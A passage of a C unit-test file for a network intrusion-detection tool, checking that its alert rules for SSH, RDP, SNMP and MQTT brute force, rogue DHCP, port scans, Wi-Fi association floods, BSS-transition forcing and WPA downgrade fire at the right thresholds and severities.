    int idx = find_alert(&s, ALERT_TYPE_SSH_BRUTE_FORCE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.5");
    ASSERT_EQ((int)s.alerts[idx].match_port, 22);
    ASSERT(strstr(s.alerts[idx].detail, "10 SSH banners") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "OpenSSH") != NULL);
}

static void test_ssh_brute_force_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ssh_flow(&s, "10.0.0.5", "10.0.0.10", 9);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SSH_BRUTE_FORCE), -1);
}

static void test_ssh_brute_force_per_pair(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_ssh_flow(&s, "10.0.0.5", "10.0.0.10", 25);
    seed_ssh_flow(&s, "10.0.0.6", "10.0.0.11", 15);
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_SSH_BRUTE_FORCE) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── RDP brute force ────────────────────────────────────── */

static void seed_rdp_flow(sloth_state_t *s, const char *src_ip,
                           const char *dst_ip, int cr_count,
                           const char *cookie) {
    if (s->rdp_flow_count >= MAX_RDP_FLOWS) return;
    rdp_flow_t *e = &s->rdp_flows[s->rdp_flow_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    snprintf(e->dst_ip, sizeof(e->dst_ip), "%s", dst_ip);
    if (cookie) snprintf(e->last_cookie, sizeof(e->last_cookie),
                          "%s", cookie);
    e->connect_req_count = cr_count;
    e->last_seen         = time(NULL);
}

static void test_rdp_brute_force_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_rdp_flow(&s, "203.0.113.7", "10.0.0.20", 10, "administrator");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RDP_BRUTE_FORCE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "203.0.113.7");
    ASSERT_EQ((int)s.alerts[idx].match_port, 3389);
    ASSERT(strstr(s.alerts[idx].detail, "10 RDP CRs") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "administrator") != NULL);
}

static void test_rdp_brute_force_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_rdp_flow(&s, "203.0.113.7", "10.0.0.20", 9, "admin");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RDP_BRUTE_FORCE), -1);
}

static void test_rdp_brute_force_per_pair(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_rdp_flow(&s, "203.0.113.7", "10.0.0.20", 25, "alice");
    seed_rdp_flow(&s, "203.0.113.8", "10.0.0.21", 15, "bob");
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_RDP_BRUTE_FORCE) count++;
    }
    ASSERT_EQ(count, 2);
}

/* No mstshash cookie observed — detail still renders without crashing. */
static void test_rdp_brute_force_no_cookie(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_rdp_flow(&s, "203.0.113.7", "10.0.0.20", 11, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RDP_BRUTE_FORCE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "user=?") != NULL);
}

/* ── SNMP community brute force ─────────────────────────── */

static void seed_snmp_flow(sloth_state_t *s, const char *src_ip,
                            const char *dst_ip, int community_count,
                            const char *last_comm) {
    if (s->snmp_flow_count >= MAX_SNMP_FLOWS) return;
    snmp_flow_t *e = &s->snmp_flows[s->snmp_flow_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    snprintf(e->dst_ip, sizeof(e->dst_ip), "%s", dst_ip);
    e->community_count = community_count;
    if (last_comm) snprintf(e->last_community, sizeof(e->last_community),
                             "%s", last_comm);
    e->last_seen = time(NULL);
}

static void test_snmp_community_brute_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_snmp_flow(&s, "10.0.0.5", "10.0.0.10", 5, "private");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_SNMP_COMMUNITY_BRUTE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.5");
    ASSERT_EQ((int)s.alerts[idx].match_port, 161);
    ASSERT(strstr(s.alerts[idx].detail, "5 SNMP communities") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "private") != NULL);
}

static void test_snmp_community_brute_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_snmp_flow(&s, "10.0.0.5", "10.0.0.10", 4, "public");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_SNMP_COMMUNITY_BRUTE), -1);
}

static void test_snmp_community_brute_per_pair(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_snmp_flow(&s, "10.0.0.5", "10.0.0.10", 8, "cisco");
    seed_snmp_flow(&s, "10.0.0.6", "10.0.0.11", 6, "admin");
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_SNMP_COMMUNITY_BRUTE) count++;
    }
    ASSERT_EQ(count, 2);
}

/* ── MQTT broker brute force ────────────────────────────── */

static void seed_mqtt_flow(sloth_state_t *s, const char *src_ip,
                            const char *dst_ip, int connect_count,
                            int fail_count, const char *user) {
    if (s->mqtt_flow_count >= MAX_MQTT_FLOWS) return;
    mqtt_flow_t *e = &s->mqtt_flows[s->mqtt_flow_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src_ip, sizeof(e->src_ip), "%s", src_ip);
    snprintf(e->dst_ip, sizeof(e->dst_ip), "%s", dst_ip);
    e->connect_count      = connect_count;
    e->connack_fail_count = fail_count;
    e->proto_level        = 4;
    if (user) snprintf(e->last_username, sizeof(e->last_username),
                        "%s", user);
    e->last_seen = time(NULL);
}

static void test_mqtt_brute_fires_at_connect_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_mqtt_flow(&s, "10.0.0.5", "10.0.0.10", 10, 0, "admin");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_MQTT_BROKER_BRUTE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT_EQ((int)s.alerts[idx].match_port, 1883);
    ASSERT(strstr(s.alerts[idx].detail, "10 CONNECTs") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "admin") != NULL);
}

static void test_mqtt_brute_fires_at_fail_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_mqtt_flow(&s, "10.0.0.5", "10.0.0.10", 5, 5, "iot-user");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_MQTT_BROKER_BRUTE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "5 fails") != NULL);
}

static void test_mqtt_brute_below_both_thresholds_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_mqtt_flow(&s, "10.0.0.5", "10.0.0.10", 9, 4, "user");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_MQTT_BROKER_BRUTE), -1);
}

static void test_mqtt_brute_per_pair(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_mqtt_flow(&s, "10.0.0.5", "10.0.0.10", 25, 0, "a");
    seed_mqtt_flow(&s, "10.0.0.6", "10.0.0.11", 12, 0, "b");
    alerts_update(&s);
    int count = 0;
    for (int k = 0; k < s.alert_count; k++) {
        if (s.alerts[k].type == ALERT_TYPE_MQTT_BROKER_BRUTE) count++;
    }
    ASSERT_EQ(count, 2);
}

/* Kills the dup-detection mutations on line 635 (`dup = 1` → 2/0) and
 * the dup-strcmp comparison: the same server seen many times must
 * count as one server, not many. */
static void test_rogue_dhcp_dedup_same_server(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 5; i++)
        add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.1", 5);
    alerts_update(&s);
    /* Five observations, one server — no rogue. */
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_DHCP), -1);
}

/* ── Dedup ───────────────────────────────────────────────── */

static void test_dedup_increments_count(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    int first_count = s.alerts[idx].count;
    ASSERT_EQ(first_count, 1);

    /* same state, fire again */
    alerts_update(&s);
    idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    ASSERT_EQ(s.alerts[idx].count, 2);
    /* only one entry (no duplicates) */
    int ps_entries = 0;
    for (int i = 0; i < s.alert_count; i++)
        if (s.alerts[i].type == ALERT_TYPE_PORT_SCAN) ps_entries++;
    ASSERT_EQ(ps_entries, 1);
}

static void test_distinct_keys_create_distinct_alerts(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    add_scan(&s, "10.0.0.55", 12, 1);
    alerts_update(&s);
    int n = 0;
    for (int i = 0; i < s.alert_count; i++)
        if (s.alerts[i].type == ALERT_TYPE_PORT_SCAN) n++;
    ASSERT_EQ(n, 2);
}

/* ── Snapshot ordering ────────────────────────────────────── */

static void test_snapshot_newest_first(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);

    /* First fire an old alert by stuffing the engine via two updates with
       different state. With current API we can't predate first_seen, but
       newer alerts will have a later last_seen. */
    add_scan(&s, "10.0.0.10", 15, 1);
    alerts_update(&s);

    /* sleep cheating: just call update again with a different IP — both will
       have last_seen ~= now, but in the order alerts were created. */
    seed_state(&s);
    add_scan(&s, "10.0.0.20", 20, 1);
    alerts_update(&s);

    /* the most recently fired key should now be at index 0 (newest first) */
    ASSERT(s.alert_count >= 2);
    /* whichever ordering: both have type PORT_SCAN, last_seen >= the other.
       Confirm sorted descending. */
    for (int i = 1; i < s.alert_count; i++)
        ASSERT(s.alerts[i - 1].last_seen >= s.alerts[i].last_seen);
}

/* ── View / key ──────────────────────────────────────────── */

static void test_view_draw_empty(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    view_alerts_draw(&s);
    ASSERT(1);
}

static void test_view_draw_populated(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    add_dns_query(&s, "192.168.1.5", "malware.testing.com");
    add_conn(&s, "192.0.2.66", 443);
    alerts_update(&s);
    ASSERT_GE(s.alert_count, 3);
    view_alerts_draw(&s);
}

static void test_view_key_nav(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    add_scan(&s, "10.0.0.55", 12, 1);
    alerts_update(&s);
    ASSERT_EQ(s.alert_sel, 0);
    view_alerts_key(&s, SLOTH_KEY_DOWN);
    ASSERT_EQ(s.alert_sel, 1);
    view_alerts_key(&s, SLOTH_KEY_UP);
    ASSERT_EQ(s.alert_sel, 0);
}

static void test_view_key_clear(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    alerts_update(&s);
    ASSERT_GT(s.alert_count, 0);
    view_alerts_key(&s, 'c');
    ASSERT_EQ(s.alert_count, 0);

    /* underlying engine cleared too — a second update with no triggers
       should leave the count at zero. */
    seed_state(&s);
    alerts_update(&s);
    ASSERT_EQ(s.alert_count, 0);
}


/* ── Assoc-request flood (#60) ───────────────────────────── */

static void feed_assoc_reqs(const uint8_t bssid[6], int n, int stas) {
    for (int i = 0; i < n; i++) {
        assoc_req_t r;
        memset(&r, 0, sizeof(r));
        memcpy(r.bssid, bssid, 6);
        r.sta[0] = 0x12; r.sta[1] = 0x22; r.sta[2] = 0x33;
        r.sta[3] = 0x44; r.sta[4] = 0x55; r.sta[5] = (uint8_t)(i % stas);
        assoc_request_observe(&r, -50, 6);
    }
}

static void test_assoc_flood_fires(void) {
    alerts_clear();
    assoc_flood_clear();
    assoc_request_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ap[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x11 };
    feed_assoc_reqs(ap, ASSOC_FLOOD_THRESH + 5, 8);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ASSOC_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:dd:ee:11") != NULL);
    /* Many sources at high rate is the spoofed-MAC shape. */
    ASSERT(strstr(s.alerts[idx].detail, "spoofed-MAC flood") != NULL);
    assoc_flood_clear(); assoc_request_clear();
}

static void test_assoc_flood_quiet_no_fire(void) {
    alerts_clear();
    assoc_flood_clear();
    assoc_request_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ap[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x12 };
    feed_assoc_reqs(ap, 5, 3);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ASSOC_FLOOD), -1);
    assoc_flood_clear(); assoc_request_clear();
}

static void test_assoc_flood_few_sources_labelled(void) {
    /* Same rate, one source: a targeted or broken client, not a
     * spoofing flood. The detail has to say which, since the response
     * differs. */
    alerts_clear();
    assoc_flood_clear();
    assoc_request_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ap[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x13 };
    feed_assoc_reqs(ap, ASSOC_FLOOD_THRESH + 2, 1);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ASSOC_FLOOD);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "from 1 STA ") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "few sources") != NULL);
    assoc_flood_clear(); assoc_request_clear();
}

static void test_assoc_flood_my_network_is_crit(void) {
    alerts_clear();
    assoc_flood_clear();
    assoc_request_clear();
    ownership_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ap[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x14 };
    ownership_add_bssid("aa:bb:cc:dd:ee:14");
    feed_assoc_reqs(ap, ASSOC_FLOOD_THRESH + 1, 6);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ASSOC_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "YOUR network") != NULL);
    ownership_clear();
    assoc_flood_clear(); assoc_request_clear();
}


/* ── BTM forcing (#59) ───────────────────────────────────── */

static const uint8_t BTM_AP[6]   = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x20 };
static const uint8_t BTM_STA[6]  = { 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc };
static const uint8_t BTM_CAND[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x21 };

/* Drive the steering table directly. The frame-level path is covered in
 * test_action_snoop.c; here the question is what the rule does with a
 * populated table, so the parser is not in the loop. */
static void feed_btm_reqs(const uint8_t bssid[6], const uint8_t sta[6],
                          int n, int imminent, const uint8_t *cand) {
    time_t now = time(NULL);
    for (int i = 0; i < n; i++) {
        sloth_btm_req_t r;
        memset(&r, 0, sizeof(r));
        memcpy(r.bssid, bssid, 6);
        memcpy(r.target_sta, sta, 6);
        r.request_mode = imminent ? BTM_REQ_DISASSOC_IMM
                                  : BTM_REQ_PREF_CANDIDATE;
        r.disassoc_timer = 10;
        if (cand) {
            memcpy(r.candidate_bssids[0], cand, 6);
            r.candidate_count = 1;
        }
        btm_observe(&r, now);
    }
}

/* Put a BSSID in the beacon snapshot so the "never beaconed" tells can
 * be exercised in both directions. */
static void add_beacon_ap(sloth_state_t *s, const uint8_t bssid[6],
                          const char *ssid) {
    beacon_ap_t *a = &s->beacon_aps[s->beacon_count++];
    memset(a, 0, sizeof(*a));
    memcpy(a->bssid, bssid, 6);
    snprintf(a->ssid, sizeof(a->ssid), "%s", ssid);
    snprintf(a->enc,  sizeof(a->enc),  "WPA2");
    a->last_seen = time(NULL);
}

static void test_btm_abuse_fires_at_threshold(void) {
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:dd:ee:20") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "12:34:56:78:9a:bc") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "evil-twin=no") != NULL);
    ASSERT_EQ(strcmp(s.alerts[idx].technique, "T1498"), 0);
    btm_clear();
}

static void test_btm_abuse_below_threshold_quiet(void) {
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH - 1, 1, NULL);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_BTM_ABUSE), -1);
    btm_clear();
}

static void test_btm_abuse_ignores_ordinary_steering(void) {
    /* Well above the rate, but every Request leaves the client the
     * choice. This is 802.11v load balancing and must stay silent — the
     * assertion that keeps the rule off a busy enterprise AP. */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH * 4, 0, NULL);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_BTM_ABUSE), -1);
    btm_clear();
}

static void test_btm_abuse_evil_twin_candidate_is_crit(void) {
    /* The forcing has an identified landing site: the candidate the AP
     * is pointing the client at is the rogue half of a detected twin
     * pair. That is the difference between a DoS and a completed AiTM
     * setup, so it is the escalation. */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP,   "corp-wifi");
    add_beacon_ap(&s, BTM_CAND, "corp-wifi");
    twin_episode_t *t = &s.twin_episodes[s.twin_episode_count++];
    memset(t, 0, sizeof(*t));
    snprintf(t->ssid, sizeof(t->ssid), "corp-wifi");
    memcpy(t->real_bssid, BTM_AP,   6);
    memcpy(t->twin_bssid, BTM_CAND, 6);
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, BTM_CAND);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "evil-twin=yes") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:dd:ee:21") != NULL);
    btm_clear();
}

static void test_btm_abuse_real_half_candidate_is_not_twin(void) {
    /* Being steered toward the *legitimate* AP of a twin pair is what
     * recovery looks like, not an attack. Matching either half would
     * turn every twin episode into a CRIT. */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP,   "corp-wifi");
    add_beacon_ap(&s, BTM_CAND, "corp-wifi");
    twin_episode_t *t = &s.twin_episodes[s.twin_episode_count++];
    memset(t, 0, sizeof(*t));
    memcpy(t->real_bssid, BTM_CAND, 6);   /* candidate is the real one */
    memcpy(t->twin_bssid, BTM_AP,   6);
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, BTM_CAND);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "evil-twin=no") != NULL);
    btm_clear();
}

static void test_btm_abuse_source_never_beaconed_reported(void) {
    /* No beacon table entry for the transmitter: it is claiming an
     * authority we have no evidence it holds. Reported in the detail,
     * not escalated — on a hopping sensor "never" means "not while we
     * were listening". */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "source never beaconed") != NULL);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    btm_clear();
}

static void test_btm_abuse_known_source_omits_the_tell(void) {
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "source never beaconed") == NULL);
    btm_clear();
}

static void test_btm_abuse_fabricated_candidate_reported(void) {
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");   /* source known, target not */
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, BTM_CAND);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "candidate never beaconed") != NULL);
    btm_clear();
}

static void test_btm_abuse_my_bssid_is_crit(void) {
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    ownership_add_bssid("aa:bb:cc:dd:ee:20");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "YOUR network") != NULL);
    ownership_clear(); btm_clear();
}

static void test_btm_abuse_rostered_client_is_crit(void) {
    /* An unrostered client being forced somewhere is a finding. One of
     * the operator's own devices being forced is an incident. */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    ownership_add_known_mac("12:34:56:78:9a:bc");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "rostered client") != NULL);
    ownership_clear(); btm_clear();
}

static void test_btm_abuse_dedup_key_is_the_pair(void) {
    /* Two clients forced by the same AP are two findings: the operator
     * needs to know how many devices were moved, and a per-BSSID key
     * would collapse them into one row with a count. */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    static const uint8_t STA2[6] = { 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbd };
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    alerts_update(&s);
    feed_btm_reqs(BTM_AP, STA2, BTM_ABUSE_THRESH + 2, 1, NULL);
    alerts_update(&s);
    int n = 0;
    for (int i = 0; i < s.alert_count; i++)
        if (s.alerts[i].type == ALERT_TYPE_BTM_ABUSE) n++;
    ASSERT_EQ(n, 2);
    btm_clear();
}

static void test_btm_abuse_reports_total_alongside_imminent(void) {
    /* The operator needs both numbers: how hard the AP is pushing, and
     * how much of that push was forcing. */
    alerts_clear(); btm_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_beacon_ap(&s, BTM_AP, "corp-wifi");
    feed_btm_reqs(BTM_AP, BTM_STA, BTM_ABUSE_THRESH, 1, NULL);
    feed_btm_reqs(BTM_AP, BTM_STA, 3, 0, NULL);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BTM_ABUSE);
    ASSERT(idx >= 0);
    char want[32];
    snprintf(want, sizeof(want), "%d/%d req", BTM_ABUSE_THRESH,
             BTM_ABUSE_THRESH + 3);
    ASSERT(strstr(s.alerts[idx].detail, want) != NULL);
    btm_clear();
}


/* ── WPA / PMF downgrade posture (#62) ───────────────────── */

static beacon_ap_t *add_ap(sloth_state_t *s, uint8_t last, const char *ssid,
                           const char *enc, uint32_t akm, int mfp,
                           int observed_secs) {
    beacon_ap_t *a = &s->beacon_aps[s->beacon_count++];
    memset(a, 0, sizeof(*a));
    a->bssid[0] = 0xaa; a->bssid[1] = 0xbb; a->bssid[2] = 0xcc;
    a->bssid[3] = 0xdd; a->bssid[4] = 0xee; a->bssid[5] = last;
    snprintf(a->ssid, sizeof(a->ssid), "%s", ssid);
    snprintf(a->enc,  sizeof(a->enc),  "%s", enc);
    a->akm_bits  = akm;
    a->mfp       = mfp;
    a->first_seen = time(NULL) - observed_secs;
    a->last_seen  = time(NULL);
    return a;
}

static int count_alerts(const sloth_state_t *s, alert_type_t t) {
    int n = 0;
    for (int i = 0; i < s->alert_count; i++) if (s->alerts[i].type == t) n++;
    return n;
}

/* ── the pure flag computation ── */

static void test_downgrade_flags_transition_mode(void) {
    beacon_ap_t a; memset(&a, 0, sizeof(a));
    a.akm_bits = RSN_AKM_PSK | RSN_AKM_SAE;
    a.mfp = 2;
    ASSERT(wifi_downgrade_flags(&a) & WPA_DG_TRANSITION_SAE_PSK);
}

static void test_downgrade_flags_pure_wpa3_is_clean(void) {
    beacon_ap_t a; memset(&a, 0, sizeof(a));
    a.akm_bits = RSN_AKM_SAE;
    a.mfp = 2;
    ASSERT_EQ((int)wifi_downgrade_flags(&a), 0);
}

static void test_downgrade_flags_mfp_optional_needs_sae(void) {
    /* MFP-optional is only the Dragonblood primitive on a BSS that
     * offers SAE. A WPA2-PSK AP with MFP capable-not-required is
     * ordinary and already reported by wifi_assess as its own finding —
     * firing here too would double-count every WPA2 network in range. */
    beacon_ap_t a; memset(&a, 0, sizeof(a));
    a.akm_bits = RSN_AKM_PSK; a.mfp = 1;
    ASSERT_EQ((int)(wifi_downgrade_flags(&a) & WPA_DG_MFP_OPTIONAL), 0);
    a.akm_bits = RSN_AKM_SAE;
    ASSERT(wifi_downgrade_flags(&a) & WPA_DG_MFP_OPTIONAL);
}

static void test_downgrade_flags_mfp_off_is_not_this_finding(void) {
    /* mfp==0 is "no MFP at all", a different and older finding. */
    beacon_ap_t a; memset(&a, 0, sizeof(a));
    a.akm_bits = RSN_AKM_SAE; a.mfp = 0;
    ASSERT_EQ((int)(wifi_downgrade_flags(&a) & WPA_DG_MFP_OPTIONAL), 0);
}

static void test_downgrade_flags_wpa1_needs_rsn(void) {
    /* WPA1 on its own is a legacy AP, already reported elsewhere. The
     * finding here is WPA1 *alongside* RSN — TKIP still on offer to
     * anything that asks for it. */
    beacon_ap_t a; memset(&a, 0, sizeof(a));
    a.has_wpa1 = 1; a.akm_bits = 0;
    ASSERT_EQ((int)(wifi_downgrade_flags(&a) & WPA_DG_WPA1_ALONGSIDE), 0);
    a.akm_bits = RSN_AKM_PSK;
    ASSERT(wifi_downgrade_flags(&a) & WPA_DG_WPA1_ALONGSIDE);
}

static void test_downgrade_flags_family_not_substring(void) {
    /* FT-SAE and SAE-EXT-KEY are the SAE lane. A substring test on the
     * display string reported transition mode for a pure FT-SAE BSS. */
    beacon_ap_t a; memset(&a, 0, sizeof(a));
    a.akm_bits = RSN_AKM_FT_SAE; a.mfp = 2;
    ASSERT_EQ((int)wifi_downgrade_flags(&a), 0);
    a.akm_bits = RSN_AKM_FT_SAE | RSN_AKM_FT_PSK;
    ASSERT(wifi_downgrade_flags(&a) & WPA_DG_TRANSITION_SAE_PSK);
}

/* ── the rule ── */

static void test_wpa_downgrade_transition_fires(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x60, "corp", "WPA3", RSN_AKM_PSK | RSN_AKM_SAE, 2, 120);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
